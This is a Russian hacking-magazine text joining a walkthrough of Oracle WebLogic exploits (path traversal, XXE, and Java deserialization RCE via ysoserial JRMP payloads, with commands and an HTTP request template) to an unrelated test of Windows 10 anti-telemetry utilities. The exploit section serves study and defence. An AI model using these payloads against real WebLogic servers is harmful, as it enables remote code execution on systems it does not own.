Так как мы уже изменяли рабочую директорию, то шелл дос тупен из веба
и можно выполнять команду. Однако, даже когда нет возможности манипу‐
лировать параметром WorkDir, есть шанс использовать еще одну уяз вимость
в названии параметра в форме загрузки. А там у нас path traversal! :)





                 Path traversal в наз вании файла при загрузке

Но это еще не все. Давай переда дим вместо шел ла простой XML‐файл. Если
теперь внимательно посмотреть на ошиб ку сервера, то можно заметить стро‐
ку Internal Exception: org.xml.sax.SAXParseException.





                    Тестирование XXE в WebLogic

Это означает, что содержимое передаваемо го файла парсится, что откры‐
вает возможность для атаки типа XXE. Эта уязвимость известна под име нем
CVE‐2018‐3246. Что бы ее быс тро проэкс плуатировать, можно воспользовать‐
ся утилитой для раскрутки слепых XML‐инъекций, написанной командой ON‐
sec на Ruby, или ее версию на Python.
  Не забывай, что разработчики не дремлют и постоянно закручивают гайки.
Поэтому на последних версиях Java (1.8 и выше) такой способ эксплу атации
уже не прокатит.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

   ДЫРЯВАЯ ЛОГИКА
              ЭКСПЛУАТИРУЕМ НОВЫЕ УЯЗВИМОСТИ
                           В ORACLE WEBLOGIC





БАГИ ДЕСЕРИАЛИЗАЦИИ (CVE-2018-2628, CVE-2018-3191, CVE-
2018-3252)
В уже далеком 2015 году исследова тели из FoxGlove Security обнаружили уяз‐
вимость, которая получила идентифика тор CVE‐2015‐4852. Благодаря ей мы
больше узнали об атаках десериализации в Java и об использовании базовых
классов из Apache Commons Collections для атак типа RCE на такие продукты,
как Jenkins, OpenNMS, WebLogic, JBoss, WebSphere. Разработчики из Oracle
приняли неоднозначное решение запат чить эту уяз вимость, добавив потен‐
циально опасные классы в блек‐лист.


public abstract class ClassFilter {
  static final String BLACK_LIST_PROPERTY = "weblogic.rmi.blacklist";
  static final String DISABLE_DEFAULT_BLACKLIST_PROPERTY = "weblogic.
rmi.disabledefaultblacklist";
  static final String DISABLE_BLACK_LIST_PROPERTY = "weblogic.rmi.
disableblacklist";
  private static final String DEFAULT_BLACK_LIST = "+org.apache.
commons.collections.functors," +
  "+com.sun.org.apache.xalan.internal.xsltc.trax," +

Как ты понимаешь, это не лучшее решение, и очень скоро был найден обход
и на горизонте показался новый баг — CVE‐2016‐0638. Исследователи обна‐
ружили функцию readExternal() класса weblogic.jms.common.StreamMes‐
sageImpl, которая в том числе выполняет десериализацию и не попадает
в черный список. Поэтому с новым пат чем этот список был расширен.
   Этого снова оказалось недос таточно, на проблему обратили внимание
большее количество ресерчеров, и вскоре появился байпас патча. Новая уяз‐
вимость получила идентифика тор CVE‐2016‐3510.
   Здесь черный список обходится при помощи weblogic.corba.utils.
MarshalledObject. В который раз с новым пат чем черный список обновля‐
ется. Только этого вновь оказалось недос таточно, и свет увидел оче редной
обход CVE‐2017‐3248. Тут исполь зовался про токол JRMP (Java Remote Mes‐
saging exchange Protocol) в рамках которо го возможен обмен сериализован‐
ными Java‐объектами. Этот протокол — часть системы удаленного выпол‐
нения методов (RMI), а он, в свою очередь, работает по TCP/IP.
   Эксплоит вызывает RemoteObjectInvocationHandler, который исполь‐
зует UnicastRef, чтобы соз дать соединение по TCP со своей RMI. Так
как обмен данными про исходит по протоколу JRMP, клиент десериализует
все данные, которые ему отправляет сервер, и поэтому становится воз‐
можным удаленное выполнение кода. Несомненно, в скором времени патч
был выпущен.
  И вот мы вплотную подоб рались к нашей уязвимости CVE‐2018‐2628. Пос‐
мотрим на то, как реализована защита от предыдущего бага. Для этого заг‐
лянем в файл com.oracle.weblogic.rjvm.jar. В нем находится нужный нам
InboundMsgAbbrev.java.


weblogic/rjvm/InboundMsgAbbrev.java
013: final class InboundMsgAbbrev
014: {
...
123:     protected Class<?> resolveProxyClass(String[] interfaces)
124:       throws IOException, ClassNotFoundException
125:     {
126:       for (String intf : interfaces) {
127:         if (intf.equals("java.rmi.registry.Registry")) {
128:           throw new InvalidObjectException("Unauthorized proxy
deserialization");
129:         }
130:       }
131:       return super.resolveProxyClass(interfaces);
132:     }

Класс resolveProxyClass про веря ет наз вание интерфейса. Если мы пыта‐
емся вызвать java.rmi.registry.Registry, то сис тема воз вращает ошиб‐
ку. Это все, конечно, хорошо, только вот сущес твует java.rmi.activation.
Activator, который облегча ет активацию удален ных объ ектов. Это значит,
что с помощью него также можно устанавливать соединения с атакующим
сервером, который отправит пейлоад.
  Для этих целей и эксплуата ции всевозможных видов атак с применением
сериализованных объектов Java есть утилита ysoserial. Пос ледний ском‐
пилированный билд ты всег да можешь ска чать с Jitpack, но нам нужно взять
существующий шаблон  JRMPClient  и  переписать  его  в  соответс твии
с нашими реалиями. Поэтому понадобится maven и клиент Git.


git clone https://github.com/frohoff/ysoserial
cd ysoserial

Нам нужен файл /src/main/java/ysoserial/payloads/JRMPClient.java.
Копируем его под именем JRMPClient2 и переименовываем используемый
интерфейс из Registry в Activator.


/src/main/java/ysoserial/payloads/JRMPClient2.java
5: import java.rmi.activation.Activator;
...
54: public class JRMPClient2 extends PayloadRunner implements Object
Payload<Activator> {
...
56:     public Activator getObject ( final String command ) throws
Exception {
...
73:         Activator proxy = (Activator) Proxy.newProxyInstance(
JRMPClient.class.getClassLoader(), new Class[] {
74:             Activator.class
75:         }, obj);
76:         return proxy;
77:     }
...
81:         Thread.currentThread().setContextClassLoader(JRMPClient2.
class.getClassLoader());

Теперь нам нужно скомпилировать утилиту.


mvn clean package

Если не хочешь возиться со всем этим, то можно скачать готовый  jar
из репозитория brianwrf.
   WebLogic использует проприетарный протокол T3 для реализации спе‐
цификаций RMI. Подключение и общение с сервером через него — отдель‐
ная тема, эту часть ты можешь глянуть в эксплоите. А процесс эксплуатации
такой.
   1. Запускаем сервер JRMP, который будет доставлять полезную нагрузку
на сервер:


java ‐cp ysoserial‐0.0.6‐SNAPSHOT‐BETA‐all.jar ysoserial.exploit.
JRMPListener <порт> CommonsCollections1 '<команда>'

2. Генерируем пейлоад, который будет отправляться на уязвимый WebLogic‐
сервер. Здесь исполь зуем созданный нами JRMPClient2. Он зас тавит его
приконнектиться к нашему JRMP‐серверу с полез ной нагрузкой.


java ‐jar ysoserial‐0.0.6‐SNAPSHOT‐BETA‐all.jar JRMPClient2 <ip_JRM
PListener>:<порт_JRMPListener> > payload.raw

3. Подключаемся к WebLogic по протоколу T3 и отправляем ему пейлоад
из предыдущего шага.


java ‐cp target\ysoserial‐0.0.6‐SNAPSHOT‐all.jar ysoserial.exploit.
JRMPListener 1099 CommonsCollections1 "touch /tmp/exploit"
python 44553.py 192.168.99.100 7001 ysoserial\target\ysoserial‐0.0.6‐
SNAPSHOT‐all.jar 192.168.99.1 1099 JRMPClient2





   Выполнение произволь ного кода в WebLogic через десериализацию

Разработчики были проинформирова ны и выпустили фикс, но окончательно
запатчить эту проб лему у них вновь не вышло. Черный список снова вырос
в размерах.


private static final String[] DEFAULT_BLACKLIST_PACKAGES = {
"org.apache.commons.collections.functors", "com.sun.org.apache.xalan.
internal.xsltc.trax",
"javassist", "java.rmi.activation", "sun.rmi.server" };
private static final String[] DEFAULT_BLACKLIST_CLASSES = {
"org.codehaus.groovy.runtime.ConvertedClosure",
"org.codehaus.groovy.runtime.ConversionHandler", "org.codehaus.
groovy.runtime.MethodClosure",
"org.springframework.transaction.support.AbstractPlatformTransact
ionManager",
"java.rmi.server.UnicastRemoteObject", "java.rmi.server.Remote
ObjectInvocationHandler" };

Его пополнили пакеты java.rmi.activation, sun.rmi.server и классы
java.rmi.server.UnicastRemoteObject, java.rmi.server.RemoteObject‐
InvocationHandler, но им быстренько нашлась замена в виде java.rmi.
server.RemoteObject. Этот обход (CVE‐2018‐3245) обнаружил Чжан Чжии
(Zhiyi Zhang) из 360 ESG Codesafe Team. Он зарелизил новый пейлоад
для ysoserial.


/ysoserial/src/main/java/ysoserial/payloads/JRMPClien-
t_20180718_bypass01.java
01: package ysoserial.payloads;
02:
03: import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;
04: import sun.rmi.server.UnicastRef;
05: import sun.rmi.transport.LiveRef;
06: import sun.rmi.transport.tcp.TCPEndpoint;
07: import ysoserial.payloads.annotation.Authors;
08: import ysoserial.payloads.annotation.PayloadTest;
09: import ysoserial.payloads.util.PayloadRunner;
10:
11: import java.lang.reflect.Proxy;
12: import java.rmi.registry.Registry;
13: import java.rmi.server.ObjID;
14: import java.rmi.server.RemoteObjectInvocationHandler;
15: import java.util.Random;
16:
17:
18: @SuppressWarnings ( {
19:     "restriction"
20: } )
21: @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConn
ectSMTest")
22: @Authors({ Authors.MBECHLER })
23: public class JRMPClient_20180718_bypass01 extends PayloadRunner
implements
24: ObjectPayload<ReferenceWrapper_Stub> {
25:     public ReferenceWrapper_Stub getObject ( final String command
 ) throws Exception {
26:
...
41:         ReferenceWrapper_Stub stud = new ReferenceWrapper_Stub(
ref);
42:         return stud;
...
46:     public static void main ( final String[] args ) throws Except
ion {
47:         Thread.currentThread().setContextClassLoader(JRMPCl
ient_20180718_bypass01.class.getClassLoader());
48:         PayloadRunner.run(JRMPClient_20180718_bypass01.class,
args);

Использовать можно аналогично предыду щему.


ДЕСЕРИАЛИЗАЦИЯ ЧЕРЕЗ POST (CVE-2018-3252)
Вот мы и подобрались к пос ледней уяз вимости. Она тоже про десери али‐
зацию, но на этот раз через зап рос по HTTP. В WebLogic есть сервлет
для деплоя. Он вызывается при помощи отправки POST на /bea_wls_de‐
ployment_internal/DeploymentService.


weblogic/deploy/service/internal/transport/http/DeploymentService-
Servlet.java
242:   private final void internalDoPost(HttpServletRequest req,
HttpServletResponse res, AuthenticatedSubject user)
243:     throws IOException
244:   {
245:     String requestType = mimeDecode(req.getHeader("wl_req
uest_type"));
246:
247:     try
248:     {
...
252:       if (requestType.equals("data_transfer_request")) {
253:         handleDataTransferRequest(req, res, user);
254:         return;
255:       }

Тип запроса передается в заголовке wl_request_type. Если он равен
data_transfer_request, то запрос обра баты вается с помощью handle‐
DataTransferRequest.


weblogic/deploy/service/internal/transport/http/DeploymentService-
Servlet.java
1075:   private void handleDataTransferRequest(HttpServletRequest req
, HttpServletResponse res, AuthenticatedSubject user)
1076:     throws IOException
1077:   {
1078:     if (isDebugEnabled()) debug("Received DataTransferReq
uest : ");
1079:     String peerVersion = readOrConstructPeerVersion(req);
1080:     if (isDebugEnabled()) debug("Peer Version : " + peerVersion
);
1081:     String reqIdString = req.getHeader("deployment_request_id")
;
1082:     long requestId = reqIdString != null ? Long.parseLong(
reqIdString) : ‐1L;
1083:
1084:     String srcServer = mimeDecode(req.getHeader("serverName"));
1085:
1086:     ObjectInputStream in = null;
1087:     try {
1088:       in = new DeploymentObjectInputStream(req.getInputStream()
, peerVersion);
1089:
1090:       DataTransferRequest request = (DataTransferRequest)in.
readObject();

Тело      запроса      попадает      в      конструктор      класса
DeploymentObjectInputStream, а затем в readObject() происходит его
десериализация. Функция определяет, к какому типу относятся отправленные
данные.


weblogic/rjvm/InboundMsgAbbrev.java
44:   private Object readObject(MsgAbbrevInputStream in)
45:     throws IOException, ClassNotFoundException
46:   {
47:     int typecode = in.read();
48:     switch (typecode)
49:     {
50:     case 1:
51:       return in.readASCII();
52:     case 0:
53:       return new ServerChannelInputStream(in, null).readObject();
54:     }
55:     throw new StreamCorruptedException("Unknown typecode: '" +
typecode + "'");
56:   }

Очень похожее поведение наблюда ется при указании в качестве типа зап‐
роса deployment_svc_msg.


weblogic/deploy/service/internal/transport/http/DeploymentService-
Servlet.java
249:       if (requestType.equals("deployment_svc_msg")) {
250:         handleDeploymentServiceMessage(req, res, user);
251:         return; }
...
952:   private void handleDeploymentServiceMessage(HttpServletRequest
 req, HttpServletResponse res, AuthenticatedSubject user)
953:     throws IOException
954:   {
...
979:       in = new DeploymentObjectInputStream(req.getInputStream(),
 peerVersion);
980:
981:       DeploymentServiceMessage message = (DeploymentServi
ceMessage)in.readObject();

Уязвимость возможно проэксплуатировать, толь ко если ты авторизован,
поэтому в хидерах также переда ем логин и пароль пользовате ля. Тогда зап‐
рос приобретает сле дующий вид:


POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1
Host: weblogic.vh:7001
wl_request_type: data_transfer_request
username: weblogic
password: <пароль>
deployment_request_id: 360901
Connection: close
<rce‐payload>

PoC еще не всплывал в паб лике, поэтому у тебя есть воз можность написать
его самому. Вооружайся исходниками — и вперед.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Сегодня мы научились выполнять код в WebLogic разными способами. Разоб‐
рали, как можно эксплуатировать уяз вимос ти типа десери ализация объ ектов.
Попробовали работать с утилитой ysoserial, делать пейлоады для нее
и использовать их в бою.
   Чтобы самому не стать жер твой атак такого типа, придерживайся несколь‐
ких правил. Старайся всег да использовать последнюю версию дистрибути ва
Java. Разработчики из  Oracle с каждым релизом ужес точают правила
безопасности своего продукта. Например, появи лась встроенная фильтра‐
ция потенциально опасных пользовательских сериализованных данных —
JEP290.
  Своевременно  уста навливай  секь юрити‐пат чи,  выпускаемые  Oracle.
Помимо этого, желательно нас троить правила фильтрации протокола T3, что‐
бы к нему был доступ только с доверенных IP.
ПРИВАТНОСТЬ





 Роман Вегелин
  vegelin47@mail.ru


ПРЯТКИ
С WINDOWS 10

ТЕСТИРУЕМ ПРОГРАММЫ
ДЛЯ ОТКЛЮЧЕНИЯ СЛЕЖКИ
И ПОВЫШЕНИЯ ПРИВАТНОСТИ




С выхода Windows 10 прошло уже три с лишним года, а проб‐
лема слива пользовательских дан ных на серверы Microsoft
так и не решена. Более того, она усугубилась принудитель‐
ным сбросом нас троек приватности и перезапуском отклю‐
ченной службы обновлений. В этой статье мы сравним нес‐
колько утилит для управления «шпионскими» ком понентами
ОС и пос мотрим, насколько они эффективны на современ‐
ных сборках Windows 10.


В Microsoft никогда не скрывали, что собира ют сведения о пользовате лях,
просто раньше ограничивались витиеватыми фра зами об отправке «некото‐
рых сведений в целях улучшения поль зовательского опыта». После вступ‐
ления в силу Европейского рег ламента по защите данных и ряда других
законов юристам компании пришлось рас крыть подробнос ти. Вот здесь мож‐
но почитать о том, какие данные собираются, куда передаются, как обра‐
батываются и в каких случаях рас крываются.
  Перед потребителями в Microsoft выкрутились тем, что якобы дают воз‐
можность самостоятельно нас троить тип и количество передаваемых данных.
Для этого необходимо установить пакет обновлений (для тех, у кого билд
ниже 15063.0) и восполь зоваться экра ном конфиденциальности. Желательно
сделать это еще на этапе уста новки.





         Экран конфиденциальности при установке Windows 10

По задумке, у пользователя воз ника ет ощущение, что если все отключено, то
данные утекать не будут. Однако это намеренно создаваемая иллюзия. Давай
запустим сниффер и пос мотрим, как обстоят дела в действительности.


МЕТОДИКА ТЕСТИРОВАНИЯ
Все тесты проводились параллельно на двух тестовых сборках Windows 10
Pro — 1709 и 1803. Чтобы усло вия тестирова ния были идентичны, каждая
«антишпионская» программа была разверну та в клонах виртуал ки. На скрин‐
шотах в статье сначала приводится снимок работы в 1709, а затем в 1803,
если не указано иное. В качес тве вспомога тель ных ути лит использовались
Wireshark 2.6.3 64 bit, TCPView v. 3.05 и Regshot v. 2.1.0.17.
  Во всех тестируемых программах выбирались настройки блокировки
по максимуму. Если какую‐то функцию или приложение не заблокировать, то
возникнет неопределен ная погрешность. Будет непонятно: то ли это незаб‐
локированный пункт приводит к сливу данных, то ли какую‐то функцию прог‐
рамме не удалось отключить. Идеальный резуль тат — это дамп сетевого тра‐
фика без IP‐адресов Microsoft. Посмотрим, кто как справится с этой задачей,
но  для  начала  проверим  штатные функции  управле ния  приватностью
в Windows.


ПРОВЕРКА НАСТРОЕК ПРИВАТНОСТИ
Если оставить настрой ки по умолчанию, то пос ле загрузки ОС сразу виден
большой поток исходящего тра фика на адреса Microsoft.





  Мониторинг сетевого тра фика с дефолтными настройками приватности

Теперь отключаем все, что отклю чает ся на экра не приватности. Результат
налицо.





   Мониторинг сетевого тра фика с обрезанной передачей телеметрии

Однако даже после переключения всех флажков в запрещающее положение
некоторые данные сразу отправляют ся в облачную платформу Microsoft Azure,
причем в Сингапуре. В логах Wireshark я заметил IP‐адреса сетевых узлов Mi‐
crosoft из разных стран мира. Видимо, так работает балансировка нагрузки.
Соединение с ними не пос тоянное (вышел на связь, передал что надо
и оборвал соединение). Пул адресов очень большой. Я их перепроверил
и убедился, что почти все они принадлежат Microsoft или ее партнерским
сетям.


СРАВНЕНИЕ ПРОГРАММ
Для сравнения мы отобрали следующие «антишпионские» программы: Black‐
bird  1.0.28,  Destroy Windows 10  Spying  1.0.1.0, DoNotSpy10  4.0, O&O
ShutUp10 1.6.1399, Disable Win Tracking 3.2.1 и WPD 1.2.940. У всех этих при‐
ложений одна цель — не дать Microsoft получить какие‐либо данные извес‐
тным путем. Не лишены они и разных плюшек типа блокировки обновлений.
Вот примерный список того, что следует ожидать от таких утилит:
 • отключение записи активности пользователя;
 • отключение отправки данных о вводе с клавиатуры;
 • отключение отправки образцов рукописного вво да;
 • отключение сбора диагностических данных (телеметрии);
 • отключение сбора данных о мес тополо жении;
 • отключение и сброс персональных нас троек Cortana;
 • отключение доступа в интернет для Windows Media DRM;
 • отключение доступа приложений к информации об учетной записи, кален‐
   дарю, сообщениям, камере, микрофону и мес тоположению;
 • (опционально) отключение служ бы обновления Windows для дру гих про‐
   дуктов.

Конечно, это не пол ный перечень, но тот разумный минимум, на который сто‐
ит ориентироваться. Все эти изменения можно сделать и вручную. Подобные
«антишпионские» утилиты подкупа ют лишь тем, что применяют сотню твиков
в пару кликов.
   Как вообще работают эти утилиты?
 1. Изменяют ключи реес тра, отвечающие за настройки приватности.
 2. Добавляют в файл %WINDIR%\System32\drivers\etc\hosts извес‐
   тные авторам программы URL сетевых узлов, на которые Microsoft сливает
   данные.
 3. Добавляют в брандма уэр Windows наборы запрещающих правил, блокиру‐
  ющие подклю чение к извес тным IP‐адресам Microsoft.
 4. Останавливают «следящие» службы.
 5. Удаляют «шпионские» задания планировщика.
 6. В хардкорном варианте удаляют системные файлы и каталоги, отве‐
  чающие за «шпионские» функции.


           WARNING

                    Попытка  добиться  максимальной  приватности
                        с помощью подобных программ может привести
                          к тому, что перестанут работать и нужные ком‐
                      понен ты, слетит акти вация Windows, ОС будет
                       вести себя нестабильно или вообще не  заг‐
                       ружаться. Настоятельно рекомендуем не огра‐
                       ничиваться  встроенными  в  них  средствами
                      резервного копирования, а использовать сто рон‐
                      ние программы для создания полного образа
                      диска. С ним гарантирован но  останет ся  воз‐
                      можность вернуть систему в исходное состояние,
                         что бы с ней ни случилось в ходе экспериментов.



Blackbird 1.0.28
https://www.getblackbird.net
   Программа работает в консольном режиме. У нее изначально всего три
функции:
 • сканировать систему и вывести все (по мнению разработчика) обнаружен‐
  ные проблемы;
 • запустить менеджер блокировки;
 • сделать бэкап настроек. Вот эту функцию хочу особо отме тить. Не каждая
   программа позволяет это сделать, так что, если что‐то пошло не так, прос‐
   то восстанавливаем настройки до блокировки и работаем дальше. Бэкап
  помещается в папку с программой, и, когда он сделан, программа меняет
   одну из своих функций с «Бэкапировать» на «Восстановить из бэкапа».





                     Ин терфейс Blackbird

После сканирования выда ется очень большой список «недочетов», которые
надо исправить.





                     Сканирование в Blackbird

Пунктов в нем и вправду мно го, но есть очень спорные моменты. К примеру,
первым делом резанул глаз пункт блокировки службы W32Time. Если комп
будет в домене, то как син хронизировать время с сервером?
  Перейдем к списку бло кировки. Нажимаем А на главном экране прог‐
раммы и видим такую картинку.





         Список приложений и служб для блокировки Blackbird

Обрати внимание, что в билде 1803 добавлены несколько новых функций,
поэтому блокировке подлежит 78 пунктов, а не 70, как в 1709. Вот наглядный
пример, почему для теста я выбрал два релиза Windows 10.





                Разница в билдах Windows 10 в Blackbird

В списке компонентов, которые может отключить Blackbird, нет службы Win‐
dows Update. Само отключение сделано неудоб но: нет готовых профилей
настроек, каждый пункт приходится выбирать отдельно.
  После выполненных действий в сборке 1709 уда лось отключить все «сле‐
дящие» функции, программа спра вилась на ура. На сборке 1803 одна фун‐
кция так и не была отключена, причем их общее количество почему‐то ста‐
ло 79.




             Blackbird не пол ностью справилась со сборкой 1803

Два дня наблюдений за поведением операционных систем показали, что пос‐
ле работы Blackbird исхо дящий тра фик стал мень ше в разы. Однако тестовый
комп со сборкой 1803 постоянно переда вал данные на IP 104.25.219.21.
Shodan говорит, что он принадлежит известному облачному провайдеру
Cloudﬂare. Насколь ко мне известно, Microsoft давно арендует у него хостинг
для виртуальных серверов сбо ра ста тистики. Боль ше подобной сетевой
активности не отмечалось, если не считать ска чивания обновле ний.
  С блокировкой сле дящих функций Blackbird в целом справилась, но обе
тестовые сборки из‐за нее пришли в нерабо чее сос тояние. Меню «Пуск»
не открывается. Edge и IE не запус каются. Магазин приложений и почта пыта‐
ются запуститься, но сра зу закрываются. В панели уведомлений висят сооб‐
щения, которые нельзя открыть. В общем, жить с настолько изуродованной
операционкой невозможно. Хоть обновления уста новились без проблем!
  При восстановлении из созданно го Blackbird бэкапа лучше не стало.
В сборке 1709 слетела активация Windows и появились две ошибки реестра.
После перезагрузки ни одна проблема так и не была устранена. Сбор‐
ка 1803 вообще не смогла запус тить Blackbird для вос становления из бэкапа,
начав ругаться на ошибку файловой системы (хотя с ФС все было в порядке).





              Ошибки при вос ста новлении бэкапа

Вывод очевиден. Blackbird место в нашей бывшей рубрике «Западлостро‐
ение».


Destroy Windows 10 Spying 1.0.1.0
https://github.com/Nummer/Destroy‐Windows‐10‐Spying
   Destroy Windows 10 Spying — программка, которая, скорее всего, уже
на слуху у каждого, кто задавался воп росом, как отключить передачу своих
данных в Microsoft. Погова ривают, что после версии 1.0.1.0 сменился раз‐
работчик и в новые релизы начали вши вать тро ян. Поэтому вос пользуемся
последней официальной версией, которую выпустил Nummer.
  Версия 1.0.1.0 написана в апреле 2018 года. На моих сборках она запус‐
тилась и определила их пра виль но. Помимо прочего, в программе есть фун‐
кция отключения обновлений Windows, которой я заодно и вос пользовался.





                      Destroy Windows 10 Spying 1.0.1.0

Все изменения вносятся при нажатии большой кнопки «Destroy Windows Spy‐
ing NOW!». Работа программы проходит в три эта па: отключение «шпионских»
сервисов, добав ление извес тных IP‐адресов в пра вила брандмауэра и про‐
писывание URL серверов сбо ра ста тис тики Microsoft в файл host. Затем сле‐
дует перезагрузка с применением всех изменений.
  Результаты работы DWS меня огорчили.





                   Дамп Wireshark после DWS

Исходящий трафик по «левым» адресам стал мень ше, но по‐прежнему наб‐
людалось активное общение с ненужными нам IP‐адресами. Версия прог‐
раммы устарела, и в новых сборках Windows свою функцию она тол ком
не выполняет. Однако утилита и не калечит операци онку, как это делает
Blackbird. Мои виртуальные компь ютеры пос ле DWS выжили. В течение трех
дней никаких программных неполадок выявлено не было. Сразу после
перезагрузки сборка 1709 зависала пару раз, но обошлось малой кровью,
и все восстановилось.
  С блокировкой Windows Update программа DWS тоже сработала криво.
После четырех‐пяти перезапусков Windows в логах TCPView снова засветил ся
svhost, который как ни в чем не бывало продолжил дос тавлять обновления.
Еще я обратил внимание на очень тесный диалог сборки 1709 с IP‐адресом
сервера в сети Akamai Technologies, сотрудничающей с Microsoft, и сильное
увеличение пакетов SSDP. Воз можно, вин да сама перебирала запасные спо‐
собы отправить данные, когда собственные серверы оказались частично
недоступны.


DoNotSpy10 4.0
https://pxc‐coding.com/donotspy10
  Еще одна популярная программа с удобным интерфейсом. Для каждого
пункта разработ чик сделал небольшое описание, поэтому разобраться в ней
просто — расставляй галочки, и вперед!





                    Ин терфейс DoNotSpy10

Эта программа предос тавляет возможность сделать точку отката сис темы
до применения изменений (не бэкап нас троек, а именно системную точку
отката). На мой взгляд, с количеством функций в ней немного перес‐
тарались — очень уж много вся ких фич. При менил я все по максимуму,
и результат работы меня удивил. Пос ле четырех часов прос тоя систем они
начали самостоятельно перезагружать ся. Ока залось, что за это время
по‐тихому накатились «заб локированные» обновления. Wireshark собрал поч‐
ти 400 тысяч пакетов за час, чего с другими прог раммами не наблюдалось.
Большинство пакетов было адресова но именно туда, куда DoNotSpy10 дол‐
жна была запретить их отсылать. Вдобавок ко всему слетели лицензии с обе‐
их ОС.
   Программа DoNotSpy10 наверняка понравится мазохистам и разочарует
всех остальных.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
ПРЯТКИ С WINDOWS 10
          ТЕСТИРУЕМ ПРОГРАММЫ ДЛЯ ОТКЛЮЧЕНИЯ
             СЛЕЖКИ И ПОВЫШЕНИЯ ПРИВАТНОСТИ





O&O ShutUp10 1.6.1399
https://www.oo‐software.com/en/shutup10
   Эта програм мка немецких раз работчиков O&O Software имеет удобный
интерфейс и несколь ко профилей настро ек. Можно применить  только
рекомендуемые или все сра зу в один клик. Также сре ди плюсов отмечу
импорт и экспорт параметров реес тра. Как показа ла практика, это очень важ‐
ный момент. Машин ный перевод на рус ский режет глаз, но его дос таточно
для понимания подсказок, которые всплывают при нажатии на строку отклю‐
чения функции.
  В окне программы сделана колонка с наз вани ем «Рекомендовано?», а в
ней пункты с пометкой «НЕТ». Сначала кажет ся, что это какие‐то особо опас‐
ные твики, но среди них перечислены и автообновления.
  Сразу хочу отметить одну важную деталь: в сборке 1709 программа пред‐
лагает изме нить 97 пунктов, а в 1803 — уже 100. Добавленные три пункта
находятся в разделе «Конфиденциальность при ложений» и запрещают дос туп
к документам, изображениям и видео.





          Различие O&O ShutUp10 на разных сборках Windows 10

При выборе пер вой же «следящей» функции программа выдала пре дуп‐
реждение о том, что в системе отключена функция создания точек вос станов‐
ления. Еще один плюс в карму!
   Как и во всех предыду щих тес тах, я выб рал настройки «ультра», чтобы
по максимуму использовать возможности программы. Сразу перед закрыти‐
ем O&O ShutUp10 предупредила, что если на комп накатятся (а по мнению
разработчиков, они все равно накатятся) обновления, то придется запускать
программу заново и воз вра щать нас тройки. Почему бы тогда пол ностью
не заблокировать их уста новку?





                  Второе немецкое предупреждение

Еще одно небольшое наб людение (это придирка, но перфекционист внутри
меня негодует): после предупреждения прог рамма предлагает перезаг‐
рузиться, но не может выполнить перезагрузку ни в сборке 1709, ни в сбор‐
ке 1803. Обе пришлось ребутить вручную.
  Сразу после следующей загрузки ОС и до запуска Wireshark TCPView
показал неприятную картину. Опять процессы общаются с адресами MS!





                  Зап рет сра ботал только час тично

Дамп Wireshark тоже не порадовал. Явно видна установка сес сии и передача
данных, хотя пакетов отправляется и не так много.





                 Дамп трафика Windows 10 1803

Как и ожидалось, svhost подкачивает обновления, хотя я отключил их в O&O
ShutUp10, указав два связанных с Windows Update пункта.
  Через пять‐восемь часов пропал дос туп к интернету. Вернуть его удалось
перезагрузкой сетевого адап тера, но следующая проверка наличия обновле‐
ний в Windows закончилась неудачей.





                    Ошибка обновлений

Спустя сутки изменились два параметра: были отклю чены «Запретить выпол‐
нение приложе ний в фоновом режиме» и «Отклю чение телеметрии (3 из 3)».
На 1709 подобного не наб людалось.





                    O&O ShutUp10

Через два дня после использования O&O ShutUp10 полет нормальный и кар‐
тина в целом радует. Изредка в сетевом трафике проскакивают адреса сер‐
веров Microsoft из разных стран. В сборке 1803 с ними общаются в основном
backgroundTaskHost, dasHost.exe и svhost (пос ледний держит устойчивое
соединение на протяжении всей работы), а в 1709 — только svhost. Кроме
того, в сборке 1803 пос ле каждого перезапуска программы отключается
параметр  «Запретить  выполнение  приложений  в  фоновом  режиме»
(за 1709 такого поведения не замечено) и автоматически восстанавливаются
отдельные параметры, которые O&O ShutUp10 ранее выключила или заб‐
локировала. Получается, что Windows 10 1709 она покорила, а вот 1803 ей
пока не по зубам.
  Возврат настроек прошел безболезненно. Тут и говорить особо не о чем.
  К работе самих ОС после использования O&O ShutUp10 никаких нарека‐
ний нет. Несколько раз был удивлен более быстрой работой (с нищебродски‐
ми ресурсами, выделенными на одну основную и две гостевые ОС, мне
это очень сильно заметно).


Disable Win Tracking
https://github.com/10se1ucgo/DisableWinTracking
   Disable Win Tracking 3.2.1 — еще одна неболь шая и прос тая утилита
со спартанским интерфейсом. Обновилась она в начале года, но про поддер‐
жку разных билдов Windows ничего не ска зано.





                             Disable Win Tracking

Пункт Services име ет на выбор два режима: уда лить службы и отключить их (я
выбирал удалить). Действия производятся с дву мя службами: DiagTrack
(сервис контроля за сбо ром диаг ности чес ких данных) и dmwappushsvc (служ‐
ба маршрутизации WAP Push Message). Все остальное довольно просто
и понятно. При выделении части пунктов ути лита заботливо предупредит, что,
если отключаешь какие‐то функции, будут пос ледствия и некоторые приложе‐
ния могут перестать работать.


             INFO

                     Изначально   DiagTrack  распростра нялся   как
                      опциональное  обновление  KB3022345.  Этот
                     «шпионский» сервис можно было вооб ще не уста‐
                       навливать или удалить штатными средствами,
                      но в конце 2015 года хитрецы из Microsoft пере‐
                    именовали  его  в Connected  User  Experiences
                      and Telemetry и зашили в систему как обязатель‐
                     ный компонент.


Нажимаем GO, и после завершения нам выда ется подробный отчет о про‐
деланной работе. Любопытно полистать и посмотреть, что все же программа
делает.
  Через три дня теста установились очередные обновле ния. Служба dmwap‐
pushsvc снова появилась в списке, но была в отключенном состоянии.
По результатам мониторинга сети: адреса Microsoft и Akamai в логах никуда
не делись. Мои операционки регулярно выходили с ними на связь, но тра‐
фика стало меньше. На стабильнос ти работы ОС действия Disable Win Track‐
ing никак не отразились, а вот Skype перес тал работать. Вмешательства
в систему оказались минимальные: добавление правил для встроенного фай‐
рвола и несколько правок реес тра.


Windows Privacy Dashboard
https://wpd.app/
  Последняя утилита, которую хотелось бы разобрать, — WPD 1.2.940.
На момент написания статьи текущий релиз был от 11 октября 2018 года,
но правила блокировки следящих компонентов  в нем использовались
от 16 сентября. Заявлена поддержка Windows 10 вплоть до 1809. Функции
программы разбиты на три раз дела: управление конфиденциальностью, соз‐
